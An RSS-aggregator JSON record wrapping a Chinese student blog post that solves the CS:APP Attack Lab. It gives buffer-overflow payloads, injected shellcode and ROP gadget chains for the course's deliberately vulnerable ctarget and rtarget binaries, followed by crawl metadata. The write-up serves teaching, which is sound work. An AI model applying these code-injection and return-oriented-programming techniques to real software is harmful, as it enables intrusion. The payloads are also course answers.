{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-11-12 14:12:11","updatedTime":"2020-11-12 14:12:11","title":"CS: APP Attack Lab 缓冲区溢出攻击","link":"http://ipotato.me:80/article/47","description":"\n            \n             <p>学校的计算机系统课用的是 CMU 的教材，刚好做到了缓冲区溢出的实验，所以为了~~博客文章+1~~学术交流，在这里记录一下解题过程。操作环境是学校服务器的 Ubuntu 16.04.5 LTS，实验所用程序均为 64 位版本。</p>\n<h1>准备工作</h1>\n<p>先做一些准备工作。事先反汇编好两个 target 文件，然后把 <code>cookie.txt</code> 中的值记录下来，作为我们解题需要的关键信息。</p>\n<div class=\"highlight-pre\"><div class=\"highlight\" style=\"background: #ffffff\"><pre style=\"line-height: 125%\"><span></span>~$ <span style=\"color: #003388\">cd</span> target102\n~/target102$ objdump -d ctarget &#62; ctarget.s\n~/target102$ objdump -d rtarget &#62; rtarget.s\n~/target102$ cat cookie.txt\n0x32046301\n</pre></div>\n</div><p>由于整个实验都是围绕着一个输入函数展开的，我们先来了解一下其源代码：</p>\n<div class=\"highlight-pre\"><div class=\"highlight\" style=\"background: #ffffff\"><pre style=\"line-height: 125%\"><span></span><span style=\"color: #888888; font-weight: bold\">void</span> <span style=\"color: #0066bb; font-weight: bold\">test</span>() {\n    <span style=\"color: #888888; font-weight: bold\">int</span> val;\n    val = getbuf();\n    printf(<span style=\"color: #dd2200; background-color: #fff0f0\">&#34;No exploit. Getbuf returned 0x%x</span><span style=\"color: #0044dd; background-color: #fff0f0\">\\n</span><span style=\"color: #dd2200; background-color: #fff0f0\">&#34;</span>, val);\n}\n</pre></div>\n</div><p>由于 <code>getbuf</code> 函数并不会检查输入的字符串是否超出了缓冲区的大小，所以也就给我们进行注入提供了可能性。</p>\n<p>万事俱备，可以开始解题了。</p>\n<h1>Phase_1</h1>\n<p>先来看看第一关要触发的 touch1 函数：</p>\n<div class=\"highlight-pre\"><div class=\"highlight\" style=\"background: #ffffff\"><pre style=\"line-height: 125%\"><span></span><span style=\"color: #888888; font-weight: bold\">void</span> <span style=\"color: #0066bb; font-weight: bold\">touch1</span>() {\n    vlevel = <span style=\"color: #0000DD; font-weight: bold\">1</span>; <span style=\"color: #888888\">/* Part of validation protocol */</span>\n    printf(<span style=\"color: #dd2200; background-color: #fff0f0\">&#34;Touch1!: You called touch1()</span><span style=\"color: #0044dd; background-color: #fff0f0\">\\n</span><span style=\"color: #dd2200; background-color: #fff0f0\">&#34;</span>);\n    validate(<span style=\"color: #0000DD; font-weight: bold\">1</span>);\n    exit(<span style=\"color: #0000DD; font-weight: bold\">0</span>);\n}\n</pre></div>\n</div><p>所以第一关只需要利用缓冲区溢出「顶替」掉原有的函数返回地址即可，而我们用来冒名顶替的对象，就是第一关要求我们触发的 touch1 函数地址。所以现在我们要确定两个东西：</p>\n<ol>\n<li>缓冲区在栈中的确切大小，以便我们准备溢出字符进行攻击。</li>\n<li>touch1 函数的地址。</li>\n</ol>\n<p>用 gdb 打开 ctarget，在 <code>getbuf</code> 这个输入函数处设置断点，我们可以看到如下汇编代码：</p>\n<p><img src=\"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442444331874.jpg\" alt=\"\" /></p>\n<p>栈顶指针减去 0x18 意味着我们的缓冲区空间大小为十进制的 24 个字节，结合查看 <code>%rsp</code> 中的内容，我们可以推测出整个缓冲区的空间为从 <code>0x556694a8</code> 到 <code>0x556694c0</code> 的 24 Bytes 空间。</p>\n<p>接着我们通过反汇编 ctarget 得到的汇编文件，查找到了 touch1 的起始地址为 <code>0x401770</code></p>\n<p><img src=\"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442447700115.jpg\" alt=\"\" /></p>\n<p>所以第一关的答案即为：</p>\n<pre><code>00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n70 17 40 00 00 00 00 00</code></pre><h1>Phase_2</h1>\n<p>touch2 函数的代码：</p>\n<div class=\"highlight-pre\"><div class=\"highlight\" style=\"background: #ffffff\"><pre style=\"line-height: 125%\"><span></span><span style=\"color: #888888; font-weight: bold\">void</span> <span style=\"color: #0066bb; font-weight: bold\">touch2</span>(<span style=\"color: #888888; font-weight: bold\">unsigned</span> val) {\n    vlevel = <span style=\"color: #0000DD; font-weight: bold\">2</span>; <span style=\"color: #888888\">/* Part of validation protocol */</span>\n    <span style=\"color: #008800; font-weight: bold\">if</span> (val == cookie) {\n        printf(<span style=\"color: #dd2200; background-color: #fff0f0\">&#34;Touch2!: You called touch2(0x%.8x)</span><span style=\"color: #0044dd; background-color: #fff0f0\">\\n</span><span style=\"color: #dd2200; background-color: #fff0f0\">&#34;</span>, val);\n        validate(<span style=\"color: #0000DD; font-weight: bold\">2</span>);\n    } <span style=\"color: #008800; font-weight: bold\">else</span> {\n        printf(<span style=\"color: #dd2200; background-color: #fff0f0\">&#34;Misfire: You called touch2(0x%.8x)</span><span style=\"color: #0044dd; background-color: #fff0f0\">\\n</span><span style=\"color: #dd2200; background-color: #fff0f0\">&#34;</span>, val);\n        fail(<span style=\"color: #0000DD; font-weight: bold\">2</span>);\n    }\n    exit(<span style=\"color: #0000DD; font-weight: bold\">0</span>);\n}\n</pre></div>\n</div><p>第二关与第一关的区别在于，触发的函数 touch2 需要一个参数，参数的内容即为我们先前拿到的 cookie 值，所以在触发 touch2 之前，我们需要将 <code>0x32046301</code> 先放入寄存器 <code>%rdi</code> 中。自己动手丰衣足食，我们要将这宝贵的 24 个字节的空间利用起来，插入我们自己写的汇编代码来完成此操作。</p>\n<pre><code>mov $0x32046301, %rdi\nret</code></pre><p>将这段汇编代码译成机器码即为 <code>48 c7 c7 01 63 04 32 c3</code>。接着，结合上一题我们得到的信息，缓冲区是从 <code>0x556694a8</code> 开始的，所以我们将自己的代码放入缓冲区的最开始，然后再利用溢出把原有的返回地址改成我们代码的起始地址即 <code>0x556694a8</code>，程序就会跳到我们的指令开始执行。最后，只要把 touch2 的地址放在下一个栈顶即可。所以第二关的答案为：</p>\n<pre><code>48 c7 c7 01 63 04 32 c3\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\na8 94 66 55 00 00 00 00\n9c 17 40 00 00 00 00 00</code></pre><h1>Phase_3</h1>\n<div class=\"highlight-pre\"><div class=\"highlight\" style=\"background: #ffffff\"><pre style=\"line-height: 125%\"><span></span><span style=\"color: #888888\">/* Compare string to hex represention of unsigned value */</span>\n<span style=\"color: #888888; font-weight: bold\">int</span> <span style=\"color: #0066bb; font-weight: bold\">hexmatch</span>(<span style=\"color: #888888; font-weight: bold\">unsigned</span> val, <span style=\"color: #888888; font-weight: bold\">char</span> *sval) {\n    <span style=\"color: #888888; font-weight: bold\">char</span> cbuf[<span style=\"color: #0000DD; font-weight: bold\">110</span>];\n    <span style=\"color: #888888\">/* Make position of check string unpredictable */</span>\n    <span style=\"color: #888888; font-weight: bold\">char</span> *s = cbuf + random() % <span style=\"color: #0000DD; font-weight: bold\">100</span>;\n    sprintf(s, <span style=\"color: #dd2200; background-color: #fff0f0\">&#34;%.8x&#34;</span>, val);\n    <span style=\"color: #008800; font-weight: bold\">return</span> strncmp(sval, s, <span style=\"color: #0000DD; font-weight: bold\">9</span>) == <span style=\"color: #0000DD; font-weight: bold\">0</span>;\n}\n\n<span style=\"color: #888888; font-weight: bold\">void</span> <span style=\"color: #0066bb; font-weight: bold\">touch3</span>(<span style=\"color: #888888; font-weight: bold\">char</span> *sval) {\n    vlevel = <span style=\"color: #0000DD; font-weight: bold\">3</span>; <span style=\"color: #888888\">/* Part of validation protocol */</span>\n    <span style=\"color: #008800; font-weight: bold\">if</span> (hexmatch(cookie, sval)) {\n        printf(<span style=\"color: #dd2200; background-color: #fff0f0\">&#34;Touch3!: You called touch3(</span><span style=\"color: #0044dd; background-color: #fff0f0\">\\&#34;</span><span style=\"color: #dd2200; background-color: #fff0f0\">%s</span><span style=\"color: #0044dd; background-color: #fff0f0\">\\&#34;</span><span style=\"color: #dd2200; background-color: #fff0f0\">)</span><span style=\"color: #0044dd; background-color: #fff0f0\">\\n</span><span style=\"color: #dd2200; background-color: #fff0f0\">&#34;</span>, sval);\n        validate(<span style=\"color: #0000DD; font-weight: bold\">3</span>);\n    } <span style=\"color: #008800; font-weight: bold\">else</span> {\n        printf(<span style=\"color: #dd2200; background-color: #fff0f0\">&#34;Misfire: You called touch3(</span><span style=\"color: #0044dd; background-color: #fff0f0\">\\&#34;</span><span style=\"color: #dd2200; background-color: #fff0f0\">%s</span><span style=\"color: #0044dd; background-color: #fff0f0\">\\&#34;</span><span style=\"color: #dd2200; background-color: #fff0f0\">)</span><span style=\"color: #0044dd; background-color: #fff0f0\">\\n</span><span style=\"color: #dd2200; background-color: #fff0f0\">&#34;</span>, sval);\n        fail(<span style=\"color: #0000DD; font-weight: bold\">3</span>);\n    }\n    exit(<span style=\"color: #0000DD; font-weight: bold\">0</span>);\n}\n</pre></div>\n</div><p>通过阅读 touch3 的代码我们知道这次需要我们传入的不是 cookie 的值本身了，而是其字符串表示，所以首先需要将 <code>0x32046301</code> 译成 16 进制的 ASCii 码：<code>33 32 30 34 36 33 30 31</code>。但这里需要注意，字符串是均以 00 作为结尾的，所以应该写成：<code>33 32 30 34 36 33 30 31 00</code>。同上一题的思路，我们一开始可能会将本题的答案写成这样：</p>\n<pre><code>48 c7 c7 b8 94 66 55 c3 //mov $0x556694b8,%rdi ret\n33 32 30 34 36 33 30 31 00\n00 00 00 00 00 00 00\na8 94 66 55 00 00 00 00\n70 18 40 00 00 00 00 00</code></pre><p>结果运行后并不能成功，那么问题出在哪了？通过阅读实验的讲义和 hex2raw 这个程序的代码，我们会发现，缓冲区中的空间并不是一成不变的，随着程序的运行，不同的操作都可能会在不同程度上影响缓冲区中的内容，所以将 cookie 放在缓冲区里存储并读取的操作并不可行。因此我们只好利用缓冲区以外的栈内容了，这时可以考虑用 lea 这个命令来将存储在缓冲区外的 cookie 地址放入 <code>%rdi</code> 中。所以第三关答案为：</p>\n<pre><code>48 8d 7c 24 10 c3 00 00 //lea 0x10(%rsp),%rdi ret\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\na8 94 66 55 00 00 00 00\n70 18 40 00 00 00 00 00\n00 00 00 00 00 00 00 00\n33 32 30 34 36 33 30 31 00</code></pre><h1>Phase_4</h1>\n<p>从这一关开始，我们要使用 rtarget 作为攻击目标来进行实验，不同于 ctarget，rtarget 开启了两类栈保护机制，使得我们的攻击更难入手了。</p>\n<ul>\n<li>随机化栈地址。也就是说我们无法像上面三道题一样，确切的了解到缓冲区的起始与终止地址了，这样一来我们也就没办法随意的利用缓冲区空间来存储相关的信息了。</li>\n<li>栈不可执行。程序运行时会将栈设置为不可执行，也就意味着我们即便插入了自己写的代码，栈也不会执行它，只会把它当成普通的数字进行处理。</li>\n</ul>\n<p>有这两个门神加持，我们的攻击是否就无法入手了呢？显然不是。如果不能自己安插「奸细」的话，我们还可以利用「内鬼」。</p>\n<p>查看 rtarget 的代码，我们可以看到许多形如这样的函数：</p>\n<p><img src=\"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442467089231.jpg\" alt=\"\" /></p>\n<p>仔细观察的话我们可以发现，<code>0x40191f</code> 处的指令连起来的意思是将 <code>0x909058c2</code> 的放入到 <code>%rdi</code> 所指内存中，然后返回。但如果我们断章取义一下，从 <code>0x401922</code> 处开始看起，<code>58 90 90 c3</code> 就成了将栈顶指针出栈到 <code>%rax</code> 中然后返回，即 <code>popq %rax ret</code>。</p>\n<p>通过对比机器指令表，我们会发现 rtarget 其实有很多拥有二义性的指令可以为我们所用：</p>\n<p><img src=\"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442589957671.jpg\" alt=\"\" /></p>\n<p><img src=\"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442590127941.jpg\" alt=\"\" /></p>\n<p>利用机器指令这样的二义性，我们可以利用程序中本身就存在的代码，来达到我们的目的。通过搜寻 rtarget 中类似的内鬼，我们可以在栈中写出如下的代码，来完成触发 touch2 所需要的操作。</p>\n<pre><code>popq %rax\ncookie\nmovq %rax,%rdi\ncall touch2</code></pre><p>一一对应到程序中「内鬼」所在的地址，我们得到了第四关的答案：</p>\n<pre><code>00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n22 19 40 00 00 00 00 00 //pop 指令所在处\n01 63 04 32 00 00 00 00 //要出栈给 %rax 的 cookie\n27 19 40 00 00 00 00 00 //mov 指令所在处\n9c 17 40 00 00 00 00 00 //touch2 地址</code></pre><h1>Phase_5</h1>\n<p>第五关和第四关大同小异，只不过需要利用的「内鬼」变多了一些，因为我们要利用有限的指令在缓冲区外完成将 cookie 的 ASCii 值赋给 %rdi 这个操作，经过一番搜寻和拼凑，我们可以组成如下的代码：</p>\n<pre><code>mov %rsp, %rax\nmov %rax, %rdi\npop %rax\n0x48 //偏置值，即后来 %rsi 代表的内容，由于栈指针是在第一条被保存起来的，和位于最后的 cookie 位置偏差了 72 个字节，故此处为 0x48\nmov %eax, %ecx\nmov %ecx, %edx\nmov %edx, %esi\nlea (%rdi, %rsi, 1), %rax\nmov %rax, %rdi\ncall touch3\ncookie</code></pre><p>转换成指令相应的地址，我们就得到了最后的答案：</p>\n<pre><code>00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n4d 19 40 00 00 00 00 00\n27 19 40 00 00 00 00 00\n22 19 40 00 00 00 00 00\n48 00 00 00 00 00 00 00\n5b 19 40 00 00 00 00 00\n46 19 40 00 00 00 00 00\n62 19 40 00 00 00 00 00\n38 19 40 00 00 00 00 00\n27 19 40 00 00 00 00 00\n70 18 40 00 00 00 00 00\n33 32 30 34 36 33 30 31 00</code></pre>\n            \n        ","descriptionType":"html","publishedDate":"Sat, 08 Dec 2018 05:52:15 +0000","feedId":33384,"bgimg":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442444331874.jpg","linkMd5":"ffe1d9b95deb82254cd0b13b8821686c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"author":"JmPotato","articleImgCdnMap":{"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442444331874.jpg":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442447700115.jpg":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442467089231.jpg":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442589957671.jpg":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442590127941.jpg":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg"},"publishedOrCreatedDate":1605161531580}],"record":{"createdTime":"2020-11-12 14:12:11","updatedTime":"2020-11-12 14:12:11","feedId":33384,"fetchDate":"Thu, 12 Nov 2020 06:12:11 +0000","fetchMs":1187,"handleMs":19,"totalMs":73048,"newArticles":0,"totalArticles":61,"status":1,"type":0,"ip":"34f1b0cf0306d2f329add682111913d0","hostName":"us-031*","requestId":"ca4b10bf3f944def9dfd78a8a097963d_33384","contentType":"text/xml; charset=utf-8","totalBytes":0,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":5,"articlesImgsGithubTotal":1,"successGithubMap":{},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 02:58:24","updatedTime":"2020-09-07 05:07:26","id":33384,"name":"iPotato","url":"http://ipotato.me/feed","subscriber":96,"website":null,"icon":"https://ipotato.me/static/img/Pomash.png?v=92503571877643a64bf8a96245d6a009","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx63/cdn42@2020_2/2020/09/06/21-07-26-290_fc741958bed86c29.png","description":"","weekly":null,"link":null},"noPictureArticleList":[],"tmpCommonImgCdnBytes":0,"tmpBodyImgCdnBytes":0,"tmpBgImgCdnBytes":0,"extra4":{"start":1605161529617,"total":0,"statList":[{"spend":1945,"msg":"获取xml内容"},{"spend":19,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":6801,"msg":"正文链接上传到cdn"}]},"extra5":5,"extra6":5,"extra7ImgCdnFailResultVector":[null,{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442444331874.jpg","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":2733,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:13","host":"us-035*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c,ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442589957671.jpg","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":1723,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:15","host":"us-015*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442590127941.jpg","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":1976,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:15","host":"us-003*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442467089231.jpg","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":2260,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:15","host":"us-014*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442447700115.jpg","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":2569,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:15","host":"us-040*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442589957671.jpg","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":2190,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:17","host":"europe66*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442447700115.jpg","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":1389,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:18","host":"europe66*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442467089231.jpg","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":3571,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:18","host":"europe-59*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442590127941.jpg","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":4794,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:17","host":"us-006*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"}],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-006.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[404]},"http://europe-59.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[404]},"http://us-003.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[404]},"http://europe66.herokuapp.com/":{"failCount":2,"successCount":0,"resultList":[404,404]},"http://us-015.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[404]},"http://us-014.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[404]},"http://us-040.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[404]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442444331874.jpg","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":2733,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:13","host":"us-035*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c,ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442589957671.jpg","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":2190,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:17","host":"europe66*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442447700115.jpg","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":1389,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:18","host":"europe66*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442467089231.jpg","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":3571,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:18","host":"europe-59*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://pjeiuaplu.bkt.clouddn.com/2018-12-08-15442590127941.jpg","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":33384,"totalSpendMs":4794,"convertSpendMs":0,"createdTime":"2020-11-12 14:13:17","host":"us-006*","referer":"http://ipotato.me:80/article/47","linkMd5ListStr":"ffe1d9b95deb82254cd0b13b8821686c","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"}],"successGithubMap":{},"failGithubMap":{}}